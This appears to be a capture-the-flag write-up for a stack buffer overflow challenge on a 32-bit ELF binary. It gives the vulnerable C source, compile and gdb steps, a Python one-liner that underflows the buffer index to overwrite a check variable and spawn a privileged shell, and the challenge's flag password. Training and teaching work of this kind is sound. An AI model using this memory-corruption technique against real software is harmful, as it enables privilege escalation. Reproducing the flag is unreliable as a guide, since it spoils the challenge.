# ELF x86 - Stack buffer overflow basic 3

![3 3](https://github.com/user-attachments/assets/f5e0d145-24f4-4113-8b44-80158461b03d)

![3 2](https://github.com/user-attachments/assets/1b58aaf2-da53-46d6-9c79-612d1301f54c)

# Analysis

```c
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
 
void shell(void);
 
int main()
{
 
  char buffer[64]; // The buffer is limited to 64 bytes
  int check;
  int i = 0;
  int count = 0;
 
  printf("Enter your name: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 64) // The conditions are not greater than or equal to 64, which means going up won't work (I tried)
        printf("Oh no...Sorry !\n");
      if(check == 0xbffffabc) // We need this
        shell();
      else
        {
            read(fileno(stdin),&i,1);
            switch(i)
            {
                case '\n':
                  printf("\a");
                  break;
                case 0x08: // Step back by byte
                  count--;
                  printf("\b");
                  break;
                case 0x04: // Step forward by byte
                  printf("\t");
                  count++;
                  break;
                case 0x90:
                  printf("\a");
                  count++;
                  break;
                default:
                  buffer[count] = i;
                  count++;
                  break;
            }
        }
    }
}
 
void shell(void)
{
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}

// From analyzing the code, it's clear that we need the check variable to be equal to a hexadecimal value. The problem is that the variable itself has no input. Initially, I thought about accessing the shell directly through the main function, by going beyond the buffer, but I realized it's simpler and more logical to use the buffer variable for check.

```

# Preparing

First, we need to compile the program. Most importantly, we need to disable optimization (-O0), otherwise the variable itself will end up in "hell" and we won't be able to access the check variable from buffer.

```bash
gcc -g -O0 -m32 task.c -o task
```
- -g: Includes names so that the location can be viewed by address by specifying the variable name.
- -O0: Disables the trick. Puts the variable in memory instead of registers for optimization.
- -m32: Does everything in 4 bytes.

```c
//The main problem with compilation was probably that I didn't disable optimization, and some variables could have gone into registers where it would have been more difficult to get them out.
```

![3 4](https://github.com/user-attachments/assets/0099e6af-d11f-4bb7-8ac3-f0c5f79f605b)

We act according to the scheme
```bash
gdb task >> break main >> run >> p &buffer >> p &check >> p (long)value - (long)value
```

![3 4](https://github.com/user-attachments/assets/c6c7b816-d577-4df6-b25f-0d6435d62b63)

The difference is -4 bytes, which means we need to take 4 steps back to get to this variable.

# Solution

```(python3 -c "import sys; sys.stdout.buffer.write(b'\x08' * 4 + b'\xbc\xfa\xff\xbf')"; cat) | ./ch16```

We enter the same line, here ```b'\x08' * 4``` takes -4 steps back in the buffer and the next entry ```b'\xbc\xfa\xff\xbf'``` we write the value into this variable so that the conditions are met

# Password

**Password: Sm4shM3ify0uC4**

![3 5](https://github.com/user-attachments/assets/1df1a7a7-bbf4-4152-956d-1c090142678e)

